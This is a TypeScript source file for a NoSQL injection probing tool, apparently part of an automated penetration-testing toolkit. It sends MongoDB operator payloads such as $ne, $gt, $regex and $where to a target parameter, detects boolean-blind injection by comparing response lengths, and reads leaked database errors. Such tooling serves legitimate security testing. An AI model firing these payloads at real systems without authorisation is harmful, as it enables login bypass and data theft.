import { ToolDefinition, ToolResult } from '../types';
import { CommandExecutor } from '../executor';

const definition: ToolDefinition = {
  name: 'nosql_probe',
  description: 'NoSQL injection tester for MongoDB. Injects $ne/$gt/$regex/$where/$nin operators as JSON body and bracket-notation query params. Boolean blind detection via always-true vs always-false payload length comparison. Infers database type from operator behavior and MongoError strings.',
  status: 'available',
  version: '1.0.0',
  parameters: [
    { name: 'url', type: 'string', required: true, description: 'Target URL' },
    { name: 'parameter', type: 'string', required: true, description: 'Parameter name to inject into' },
    { name: 'method', type: 'string', required: false, description: 'GET or POST', default: 'POST' },
    { name: 'auth_header', type: 'string', required: false, description: 'Authorization header value' },
    { name: 'baseline_value', type: 'string', required: false, description: 'Valid parameter value for baseline request', default: 'test' },
    { name: 'timeout_ms', type: 'number', required: false, description: 'Per-request timeout in ms', default: 8000 },
  ],
};

const MONGO_ERROR_STRINGS = ['MongoError', 'MongoServerError', 'BSONTypeError', 'CastError', 'WriteError', 'ValidationError', 'mongo', 'mongoose'];

interface NoSqlProbeResult {
  payload_name: string;
  payload: string;
  status: number;
  length: number;
  length_delta: number;
  status_changed: boolean;
  finding: 'vulnerable' | 'possible' | 'not_vulnerable';
  error_strings_found: string[];
}

async function sendRequest(
  url: string,
  parameter: string,
  method: string,
  value: unknown,
  authHeader: string,
  timeoutMs: number,
  isJsonValue = false,
): Promise<{ status: number; length: number; bodyText: string }> {
  const headers: Record<string, string> = { 'User-Agent': 'Mozilla/5.0' };
  if (authHeader) headers['Authorization'] = authHeader;

  const controller = new AbortController();
  const timer = setTimeout(() => controller.abort(), timeoutMs);

  try {
    let resp: Response;

    if (method === 'GET') {
      const u = new URL(url);
      if (isJsonValue && typeof value === 'object' && value !== null) {
        for (const [k, v] of Object.entries(value as Record<string, string>)) {
          u.searchParams.append(`${parameter}[${k}]`, String(v));
        }
      } else {
        u.searchParams.set(parameter, String(value));
      }
      resp = await fetch(u.toString(), { headers, signal: controller.signal });
    } else {
      headers['Content-Type'] = 'application/json';
      resp = await fetch(url, {
        method: 'POST',
        headers,
        body: JSON.stringify({ [parameter]: value }),
        signal: controller.signal,
      });
    }

    clearTimeout(timer);
    const bodyText = await resp.text();
    return { status: resp.status, length: bodyText.length, bodyText };
  } catch {
    clearTimeout(timer);
    return { status: 0, length: 0, bodyText: '' };
  }
}

export const nosqlProbeTool = {
  definition,
  async execute(params: Record<string, unknown>, _exec: CommandExecutor): Promise<ToolResult> {
    const url = String(params.url || '');
    const parameter = String(params.parameter || '');
    const method = String(params.method || 'POST').toUpperCase();
    const authHeader = String(params.auth_header || '');
    const baselineValue = String(params.baseline_value || 'test');
    const timeoutMs = Number(params.timeout_ms || 8000);

    if (!parameter) return { output: 'parameter is required', parsed: { error: 'missing parameter' } };

    const baseline = await sendRequest(url, parameter, method, baselineValue, authHeader, timeoutMs);

    const payloads: Array<{ name: string; value: unknown; isJsonOp: boolean }> = [
      { name: '$ne (not-equal always-true)',   value: { $ne: 'invalid_xyz_31337_genesis' }, isJsonOp: true },
      { name: '$gt (greater-than empty)',       value: { $gt: '' },                          isJsonOp: true },
      { name: '$regex (match-all)',             value: { $regex: '.*' },                     isJsonOp: true },
      { name: '$where (eval always-true)',      value: { $where: '1==1' },                   isJsonOp: true },
      { name: '$nin (not-in-empty)',            value: { $nin: [] },                          isJsonOp: true },
      { name: 'array injection',               value: [baselineValue, '__genesis_array__'], isJsonOp: false },
    ];

    const results: NoSqlProbeResult[] = [];
    const confirmedPayloads: string[] = [];
    const errorStringsTotal: string[] = [];
    let dbTypeInference = 'unknown';

    for (const p of payloads) {
      const resp = await sendRequest(url, parameter, method, p.value, authHeader, timeoutMs, p.isJsonOp);
      const lengthDelta = resp.length - baseline.length;
      const statusChanged = resp.status !== baseline.status;
      const errorStringsFound = MONGO_ERROR_STRINGS.filter(e => resp.bodyText.toLowerCase().includes(e.toLowerCase()));

      if (errorStringsFound.length > 0 && dbTypeInference === 'unknown') dbTypeInference = 'MongoDB';
      errorStringsTotal.push(...errorStringsFound);

      let finding: 'vulnerable' | 'possible' | 'not_vulnerable' = 'not_vulnerable';
      if (statusChanged || Math.abs(lengthDelta) > 30) {
        finding = Math.abs(lengthDelta) > 100 || statusChanged ? 'vulnerable' : 'possible';
        confirmedPayloads.push(p.name);
      }

      results.push({
        payload_name: p.name,
        payload: JSON.stringify(p.value),
        status: resp.status,
        length: resp.length,
        length_delta: lengthDelta,
        status_changed: statusChanged,
        finding,
        error_strings_found: errorStringsFound,
      });
    }

    // Boolean blind pair
    const trueResp  = await sendRequest(url, parameter, method, { $ne: 'invalid_xyz_never_matches_31337' }, authHeader, timeoutMs, true);
    const falseResp = await sendRequest(url, parameter, method, { $ne: '' }, authHeader, timeoutMs, true);
    const boolBlind = Math.abs(trueResp.length - falseResp.length) > 30;
    if (boolBlind) {
      dbTypeInference = 'MongoDB';
      if (!confirmedPayloads.includes('boolean blind')) confirmedPayloads.push('boolean blind ($ne pair)');
    }

    // Infer more precisely
    const neWorks = results.find(r => r.payload_name.includes('$ne') && r.finding !== 'not_vulnerable');
    const whereWorks = results.find(r => r.payload_name.includes('$where') && r.finding !== 'not_vulnerable');
    if (neWorks && whereWorks) dbTypeInference = 'MongoDB (JS execution enabled)';
    else if (neWorks) dbTypeInference = 'MongoDB';

    const observations: string[] = [];
    if (confirmedPayloads.length > 0) {
      observations.push(`NOSQL INJECTION DETECTED: ${confirmedPayloads.join(', ')}`);
    }
    if (boolBlind) observations.push('BOOLEAN BLIND CONFIRMED: true/false $ne payloads produce different response lengths');
    if (errorStringsTotal.length > 0) observations.push(`DATABASE ERRORS LEAKED: ${[...new Set(errorStringsTotal)].join(', ')}`);
    if (observations.length === 0) observations.push('No NoSQL injection detected — all payloads produced uniform responses');

    const divider = '─'.repeat(90);
    const header = `  ${'Payload'.padEnd(30)} | ${'Status'.padEnd(6)} | ${'Length'.padEnd(7)} | ${'Delta'.padEnd(7)} | Finding`;
    const rows = results.map(r =>
      `  ${r.payload_name.padEnd(30)} | ${String(r.status).padEnd(6)} | ${String(r.length).padEnd(7)} | ${((r.length_delta >= 0 ? '+' : '') + String(r.length_delta)).padEnd(7)} | ${r.finding.toUpperCase()}`
    ).join('\n');

    const output = [
      `NoSQL Injection Probe — ${url} (parameter: ${parameter})`,
      divider,
      `Baseline: status=${baseline.status}, length=${baseline.length}`,
      `Boolean Blind: ${boolBlind ? 'CONFIRMED (true/false $ne delta: ' + Math.abs(trueResp.length - falseResp.length) + ' bytes)' : 'not detected'}`,
      `DB Type Inference: ${dbTypeInference}`,
      divider,
      header,
      divider,
      rows,
      divider,
      '',
      'FINDINGS:',
      ...observations.map(o => `  ⚠ ${o}`),
    ].join('\n');

    return {
      output,
      parsed: {
        parameter,
        baseline: { status: baseline.status, length: baseline.length },
        probes: results as unknown as Record<string, unknown>[],
        boolean_blind_confirmed: boolBlind,
        db_type_inference: dbTypeInference,
        confirmed_payloads: confirmedPayloads,
        observations,
      },
    };
  },
};
